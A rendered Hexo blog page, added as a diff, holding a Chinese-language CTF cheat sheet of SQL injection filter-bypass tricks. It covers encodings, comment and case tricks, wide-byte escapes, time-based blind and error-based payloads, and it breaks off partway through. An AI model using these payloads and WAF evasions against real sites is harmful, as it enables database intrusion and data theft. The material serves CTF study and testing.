@@ -1,0 +1,830 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/icon/warning.png">
+  <link rel="icon" href="/img/icon/warning.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="导语打了这么长时间的CTF,也见了不少的SQL注入的题目，也该好好总结一下有哪些技巧了，持续更新（自己总结外加搜集，老鸟飘过，大牛勿喷）。。。 order by 过滤两个都可以用来判断列数，但是两者是有区别的1.order by 是你select 了几个就可以在那几个的范围里面变动，超过就报错。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTF中注入常见技巧的汇总">
+<meta property="og:url" content="http://example.com/2017/11/21/mysqltrick/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="导语打了这么长时间的CTF,也见了不少的SQL注入的题目，也该好好总结一下有哪些技巧了，持续更新（自己总结外加搜集，老鸟飘过，大牛勿喷）。。。 order by 过滤两个都可以用来判断列数，但是两者是有区别的1.order by 是你select 了几个就可以在那几个的范围里面变动，超过就报错。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://picture-1253331270.cos.ap-beijing.myqcloud.com/orderby1.png">
+<meta property="og:image" content="https://picture-1253331270.cos.ap-beijing.myqcloud.com/orderby23.png">
+<meta property="og:image" content="https://picture-1253331270.cos.ap-beijing.myqcloud.com/intod.png">
+<meta property="og:image" content="https://picture-1253331270.cos.ap-beijing.myqcloud.com/order%20by%20%E7%9A%84%E9%A1%BA%E5%BA%8F.png">
+<meta property="og:image" content="https://picture-1253331270.cos.ap-beijing.myqcloud.com/into%E7%9A%84%E9%A1%BA%E5%BA%8F.png">
+<meta property="og:image" content="https://picture-1253331270.cos.ap-beijing.myqcloud.com/mysql_trick.png">
+<meta property="article:published_time" content="2017-11-21T16:54:56.000Z">
+<meta property="article:modified_time" content="2025-01-24T15:18:59.805Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="sql">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://picture-1253331270.cos.ap-beijing.myqcloud.com/orderby1.png">
+  
+  
+  
+  <title>CTF中注入常见技巧的汇总 - Hexo</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/macpanel.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>K0rz3n&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/banner/icemountain.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="CTF中注入常见技巧的汇总"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2017-11-21 16:54" pubdate>
+          November 21, 2017 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.4k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          20 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">CTF中注入常见技巧的汇总</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h2><p>打了这么长时间的CTF,也见了不少的SQL注入的题目，也该好好总结一下有哪些技巧了，持续更新（自己总结外加搜集，老鸟飘过，大牛勿喷）。。。</p>
+<h2 id="order-by-过滤"><a href="#order-by-过滤" class="headerlink" title="order by 过滤"></a>order by 过滤</h2><p>两个都可以用来判断列数，但是两者是有区别的<br>1.order by 是你select 了几个就可以在那几个的范围里面变动，超过就报错。</p>
+<span id="more"></span>
+<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/orderby1.png" srcset="/img/loading.gif" lazyload alt="orderby1"></p>
+<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/orderby23.png" srcset="/img/loading.gif" lazyload alt="orderby23"></p>
+<p>into 就比较死板，必须是你select 了几个就要into 几个，少了多了都不行。而且必须是一行才可以所以必须要limit.（1.select into 本是一个备份内容的操作。2.@是一个变量符号）</p>
+<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/intod.png" srcset="/img/loading.gif" lazyload alt="intod"></p>
+<p>2.order by 只能在 limit前使用,into 只能在limit 之后使用<br><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/order%20by%20%E7%9A%84%E9%A1%BA%E5%BA%8F.png" srcset="/img/loading.gif" lazyload alt="orderby的顺序"><br><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/into%E7%9A%84%E9%A1%BA%E5%BA%8F.png" srcset="/img/loading.gif" lazyload alt="into的顺序"></p>
+<p>小结：order by 过滤了用into</p>
+<h2 id="16进制绕过引号"><a href="#16进制绕过引号" class="headerlink" title="16进制绕过引号"></a>16进制绕过引号</h2><p>有些时候过滤了引号，导致字符串不能写入，我们可以用字符串的16进制形式绕过，这样就不需要引号了。还有hex()和unhex()这两个函数可以使用。</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> <span class="hljs-built_in">column_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=&quot;users&quot;<br><span class="hljs-keyword">select</span> <span class="hljs-built_in">column_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-number">0x7573657273</span><br></code></pre></td></tr></table></figure>
+<h2 id="等于号过滤使用like-或者-in-绕过"><a href="#等于号过滤使用like-或者-in-绕过" class="headerlink" title="等于号过滤使用like 或者 in 绕过"></a>等于号过滤使用like 或者 in 绕过</h2><p>等号过滤用in或like 代替</p>
+<pre><code class="hljs">substr(password,1,1) in(&#39;p&#39;);
+substr(password,1,1) like(&#39;p&#39;);
+</code></pre>
+<p>in 还能通过order by 指定顺序</p>
+<pre><code class="hljs">select * from users where id IN (3,6,9,1,2,5,8,7) order by field(id,3,6,9,1,2,5,8,7);
+</code></pre>
+<h2 id="代替等于号构造真值"><a href="#代替等于号构造真值" class="headerlink" title="&lt;，&gt; 代替等于号构造真值"></a>&lt;，&gt; 代替等于号构造真值</h2><p>or swords &gt; sw</p>
+<p>or swords &lt; tw</p>
+<p>or 1&lt;3 </p>
+<h2 id="字符串相等绕过"><a href="#字符串相等绕过" class="headerlink" title="字符串相等绕过"></a>字符串相等绕过</h2><p>or ‘swords’ &#x3D; ‘swords’</p>
+<h2 id="sleep过滤"><a href="#sleep过滤" class="headerlink" title="sleep过滤"></a>sleep过滤</h2><p>可以用 benchmark   BENCHMARK(count,expr)<br>BENCHMARK()函数重复countTimes次执行表达式expr,执行的时间长了，也达到了sleep的作用。<br><code>id=1 union select if(subtr(password,1,1) in(&#39;a&#39;),benchmark(10000000,sha(1)),0)</code>  </p>
+<h2 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h2><p>URLEncode编码，ASCII,HEX,unicode编码绕过</p>
+<p>1.URL编码：or 1&#x3D;1即%6f%72%20%31%3d%31</p>
+<p>2.url双重编码; ?id&#x3D;1%252f%252a*&#x2F;UNION%252f%252a &#x2F;SELECT%252f%252a*&#x2F;1,2,password%252f%252a*&#x2F;FROM%252f%252a*&#x2F;Users–+</p>
+<p>3.hex编码：见16进制绕过单引号</p>
+<p>4.ascii编码: SELECT FROM Users WHERE username &#x3D; CHAR(101, 97, 105, 116)</p>
+<p>或者</p>
+<p>char(101)+char(97)+char(105)+char(116)</p>
+<p>5.unicode编码：</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs llvm">一些unicode编码举例：  <br>单引号：&#x27;<br><span class="hljs-variable">%u0027</span> <span class="hljs-variable">%u02b9</span> <span class="hljs-variable">%u02bc</span><br><span class="hljs-variable">%u02c8</span> <span class="hljs-variable">%u2032</span><br><span class="hljs-variable">%uff07</span> <span class="hljs-variable">%c0</span><span class="hljs-variable">%27</span><br><span class="hljs-variable">%c0</span><span class="hljs-variable">%a7</span> <span class="hljs-variable">%e0</span><span class="hljs-variable">%80</span><span class="hljs-variable">%a7</span><br>空白：<br><span class="hljs-variable">%u0020</span> <span class="hljs-variable">%uff00</span><br><span class="hljs-variable">%c0</span><span class="hljs-variable">%20</span> <span class="hljs-variable">%c0</span><span class="hljs-variable">%a0</span> <span class="hljs-variable">%e0</span><span class="hljs-variable">%80</span><span class="hljs-variable">%a0</span><br>左括号(:<br><span class="hljs-variable">%u0028</span> <span class="hljs-variable">%uff08</span><br><span class="hljs-variable">%c0</span><span class="hljs-variable">%28</span> <span class="hljs-variable">%c0</span><span class="hljs-variable">%a8</span><br><span class="hljs-variable">%e0</span><span class="hljs-variable">%80</span><span class="hljs-variable">%a8</span><br>右括号):<br><span class="hljs-variable">%u0029</span> <span class="hljs-variable">%uff09</span><br><span class="hljs-variable">%c0</span><span class="hljs-variable">%29</span> <span class="hljs-variable">%c0</span><span class="hljs-variable">%a9</span><br><span class="hljs-variable">%e0</span><span class="hljs-variable">%80</span><span class="hljs-variable">%a9</span><br></code></pre></td></tr></table></figure>
+<p>6.html 实体编码：SELECT FROM Users WHERE username &#x3D; &#39;admin&#39;</p>
+<h2 id="substr-的逗号绕过"><a href="#substr-的逗号绕过" class="headerlink" title="substr()的逗号绕过"></a>substr()的逗号绕过</h2><p>from 1 for 1 代替 substr(,1,1) </p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> pass <span class="hljs-keyword">where</span> id=<span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>, <span class="hljs-built_in">substr</span>((<span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> users <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>);<br><br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> pass <span class="hljs-keyword">where</span> id=<span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>, <span class="hljs-built_in">substr</span>((<span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> users <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>) <span class="hljs-keyword">from</span> <span class="hljs-number">1</span> <span class="hljs-keyword">for</span> <span class="hljs-number">1</span>);<br></code></pre></td></tr></table></figure>
+
+<h2 id="limit-逗号绕过"><a href="#limit-逗号绕过" class="headerlink" title="limit 逗号绕过"></a>limit 逗号绕过</h2><p>limit 1 offset 0 代替limit 0,1</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> pass <span class="hljs-keyword">where</span> id=<span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>, <span class="hljs-built_in">substr</span>((<span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> users <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span> <span class="hljs-keyword">offset</span> <span class="hljs-number">0</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>);<br></code></pre></td></tr></table></figure>
+<p>还可以直接用 <code>select top 1 from admin where .....代替limit 0,1 </code></p>
+<h2 id="其他逗号绕过（使用join"><a href="#其他逗号绕过（使用join" class="headerlink" title="其他逗号绕过（使用join)"></a>其他逗号绕过（使用join)</h2><pre><code class="hljs">select * from users union select 1,2,3;
+select * from users union select * from (select 1)a join (select 2)b join (select 3)c;
+</code></pre>
+<p>NOTE : ‘using()’ can replace ‘on’ </p>
+<h2 id="greatest-between-绕过-等比较符号"><a href="#greatest-between-绕过-等比较符号" class="headerlink" title="greatest between 绕过&lt;,&gt; 等比较符号"></a>greatest between 绕过&lt;,&gt; 等比较符号</h2><p>当我们盲注的时候，要用到比较符号，如果过滤了可以用greatest(x,y,z,..)绕过 返回的是他们的最大值</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> ascii(substr(<span class="hljs-keyword">database</span>(),<span class="hljs-number">0</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">64</span><br></code></pre></td></tr></table></figure>
+<p>改成</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> greatest(ascii(substr(<span class="hljs-keyword">database</span>(),<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)),<span class="hljs-number">64</span>)=<span class="hljs-number">64</span><br></code></pre></td></tr></table></figure>
+<p>当然这里的等于号可以改成in()</p>
+<pre><code class="hljs">SELECT * FROM `p_archives_3` WHERE `picsad` between 1113 and 1122
+</code></pre>
+<p>等同于</p>
+<pre><code class="hljs">SELECT * FROM `p_archives_3` WHERE `picsad` &gt;= 1113 and `picsad`&lt;=1122
+</code></pre>
+<p>你要保证picsad是数字类型的</p>
+<h2 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h2><p>1.()<br>括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格<br>select(user())from dual where(1&#x3D;1)and(2&#x3D;2)<br>?id&#x3D;1%27and(sleep(ascii(mid(database()from(1)for(1)))&#x3D;109))%23</p>
+<p>2.&#x2F;**&#x2F;或者&#x2F;*1*&#x2F;</p>
+<p>3.%0d %0a %0c %0b %a0</p>
+<p>4.+</p>
+<p>5.TAB</p>
+<p>6.两个括号</p>
+<p>7.把上面说的编一下码试试</p>
+<p>8.select Afrom B 默认from后面必须是空格再加表名，因此为了不让你使用from可能正则表达式会检测后面的空格，我们可以用科学计数法绕过，因为1e0后面可以没有空格</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">select</span> <span class="hljs-selector-tag">A</span>,<span class="hljs-number">1</span>E0fromB  <br></code></pre></td></tr></table></figure>
+<p>这里的逗号是两列的意思 1e0占了第二列</p>
+<p>同样，上面的1E0可以用1.0代替</p>
+<p>9.\N 绕过 原来一直不知道是绕过啥，后来请教了math1as师傅发现是绕过NULL,因为\N相当于NULL</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> pass <span class="hljs-keyword">where</span> id=\Nunion <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>, <span class="hljs-built_in">greatest</span>((<span class="hljs-built_in">substr</span>((<span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> users <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span> <span class="hljs-keyword">offset</span> <span class="hljs-number">0</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)),<span class="hljs-string">&#x27;v&#x27;</span>)<span class="hljs-keyword">in</span>(<span class="hljs-string">&#x27;v&#x27;</span>);<br></code></pre></td></tr></table></figure>
+<p>10.id 与from在之间的空格绕过</p>
+<pre><code class="hljs">select+id-1+1.from users;
+select-id-1+3.from users;
+</code></pre>
+<p>注意：第二句得到的id将会是 -id+2</p>
+<h2 id="常见的注释"><a href="#常见的注释" class="headerlink" title="常见的注释"></a>常见的注释</h2><p>1.–+</p>
+<p>2.#</p>
+<p>3.%23</p>
+<p>4.– -</p>
+<p>5.%00</p>
+<p>6.&#96; 单行或者多行注释（别名）</p>
+<p>7.&#x2F;* *&#x2F; 单行或者多行注释</p>
+<h2 id="利用过滤删除绕过"><a href="#利用过滤删除绕过" class="headerlink" title="利用过滤删除绕过"></a>利用过滤删除绕过</h2><p>比如说他过滤了&#x2F;**&#x2F;（将其删除）又过滤了select那么我们可以这么写<br>sel&#x2F;**&#x2F;ect.</p>
+<p>意思就是被删除的可以加在另一个要删除的里面，这样不仅不会识别，删除后又还原了，实现绕过，这里面还包括双写被过滤字符的方法</p>
+<h2 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h2><p>经常试试大小写混合比如 UnIOn sELecT….</p>
+<h2 id="内联注释绕过"><a href="#内联注释绕过" class="headerlink" title="内联注释绕过"></a>内联注释绕过</h2><p>介绍一下什么是内联注释：&#x2F;<em>!</em>&#x2F;在其他数据库语言中是注释，但是在sql中却可以执行，为了sql提高语句的兼容性.</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">id=<span class="hljs-number">1</span><span class="hljs-comment">/*!UnIoN*/</span>+<span class="hljs-keyword">SeLeCT</span>+<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,concat(<span class="hljs-comment">/*!table_name*/</span>)+<span class="hljs-keyword">FrOM</span> <span class="hljs-comment">/*information_schema*/</span>.<span class="hljs-keyword">tables</span> <span class="hljs-comment">/*!WHERE */</span>+<span class="hljs-comment">/*!TaBlE_ScHeMa*/</span>+<span class="hljs-keyword">like</span>+<span class="hljs-keyword">database</span>()<span class="hljs-comment">-- -</span><br><br><span class="hljs-comment">/*!50001from*/</span> 表示在mysql版本高于<span class="hljs-number">50001</span>也就是mysql5中可以执行这条命令<br><br></code></pre></td></tr></table></figure>
+<h2 id="拆分字符串绕过"><a href="#拆分字符串绕过" class="headerlink" title="+ - . 拆分字符串绕过"></a>+ - . 拆分字符串绕过</h2><p>?id&#x3D;1’ or ‘11+11’&#x3D;’11+11’<br>“-“和”.”</p>
+<h2 id="反引号绕过"><a href="#反引号绕过" class="headerlink" title="反引号绕过"></a>反引号绕过</h2><p>可以用来过空格和正则，特殊情况下还可以将其做注释符用(单行或多行注释)实际上是mysql别名的用法，详细见雨神的博客<br><a target="_blank" rel="noopener" href="http://www.yulegeyu.com/2017/04/11/%E4%B8%BA%E4%BB%80%E4%B9%88-backtick-%E8%83%BD%E5%81%9A%E6%B3%A8%E9%87%8A%E7%AC%A6/">http://www.yulegeyu.com/2017/04/11/%E4%B8%BA%E4%BB%80%E4%B9%88-backtick-%E8%83%BD%E5%81%9A%E6%B3%A8%E9%87%8A%E7%AC%A6/</a><br>select <code>version()</code></p>
+<h2 id="符号代替文字绕过"><a href="#符号代替文字绕过" class="headerlink" title="符号代替文字绕过"></a>符号代替文字绕过</h2><p>1.&amp;&amp;代替and </p>
+<p>2.||代替or</p>
+<p>3.| 代替 xor</p>
+<h2 id="宽字节绕过"><a href="#宽字节绕过" class="headerlink" title="宽字节绕过"></a>宽字节绕过</h2><p>简单的讲一下，一般当引号被过滤就会在引号前加一个\，将其转义失去作用，这样我们就不能闭合引号完成注入了。但是如果他的字符集设置为了双字节，也就是说两个字符可以代表一个中文的情况，那么我们就可以构造成一个中文字，\的url是%27我们在引号前写上%df，那么%df%27构成了中文的繁体运,引号就没有被过滤，成功绕过。当然不只是%df只要在那个字符集的范围内都可以。如%bf%27 %df%27 %aa%27</p>
+<h2 id="等价函数变量的绕过"><a href="#等价函数变量的绕过" class="headerlink" title="等价函数变量的绕过"></a>等价函数变量的绕过</h2><p>1.hex()、bin() &#x3D;&#x3D;&gt; ascii()</p>
+<p>2.sleep() &#x3D;&#x3D;&gt;benchmark()</p>
+<p>这里补充一下:</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">在sqlsever 中用 <span class="hljs-keyword">waitfor </span>delay<br>在<span class="hljs-keyword">Oracle </span>中用 DBMS_PIPE.RECEIVE_MESSAGE()函数和CASEWHEN„THEN„语句<br></code></pre></td></tr></table></figure>
+<p>3.concat_ws()&#x3D;&#x3D;&gt;group_concat()</p>
+<p>4.mid()、substr() &#x3D;&#x3D;&gt; substring()</p>
+<p>5.@@user &#x3D;&#x3D;&gt; user()</p>
+<p>6.@@datadir &#x3D;&#x3D;&gt; datadir()</p>
+<p>7.@@version &#x3D;&#x3D;&gt; version()</p>
+<h2 id="数字的其他写法绕过空格"><a href="#数字的其他写法绕过空格" class="headerlink" title="数字的其他写法绕过空格"></a>数字的其他写法绕过空格</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">select</span> * from users where id=<span class="hljs-number">8</span>E0union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">0</span><br><span class="hljs-attribute">select</span> * from users where id=<span class="hljs-number">8</span>.<span class="hljs-number">0</span>union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure>
+<p>注：E0是科学计数法</p>
+<h2 id="conv-10-36-代替字母"><a href="#conv-10-36-代替字母" class="headerlink" title="conv(,10,36)代替字母"></a>conv(,10,36)代替字母</h2><p>conv(10,10,36)是大写的A<br>lower(conv(10,10,36&#x2F;16s))小写的a</p>
+<h2 id="常见的bypass"><a href="#常见的bypass" class="headerlink" title="常见的bypass"></a>常见的bypass</h2><p>1.id&#x3D;1+(UnIoN)+(SelECT)+</p>
+<p>2.id&#x3D;1+(UnIoN+SeLeCT)+</p>
+<p>3.id&#x3D;1+(UnI)(oN)+(SeL)(EcT)</p>
+<p>4.id&#x3D;1+’UnI’’On’+’SeL’’ECT’ &lt;-MySQL only</p>
+<p>5.id&#x3D;1+’UnI’||’on’+SeLeCT’ &lt;-MSSQL only</p>
+<h2 id="使用count-返回数据行数"><a href="#使用count-返回数据行数" class="headerlink" title="使用count(*) 返回数据行数"></a>使用count(*) 返回数据行数</h2><pre><code class="hljs">select count(*) from users;
++----------+
+| count(*) |
++----------+
+|       13 |
++----------+
+</code></pre>
+<p>注意： 这里的行数只是真正的行数，不是最终的id 编号</p>
+<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>1.extractvalue 报错</p>
+<pre><code class="hljs">and extractvalue(1, concat(1, (select database() limit 0,1)))--+;
+</code></pre>
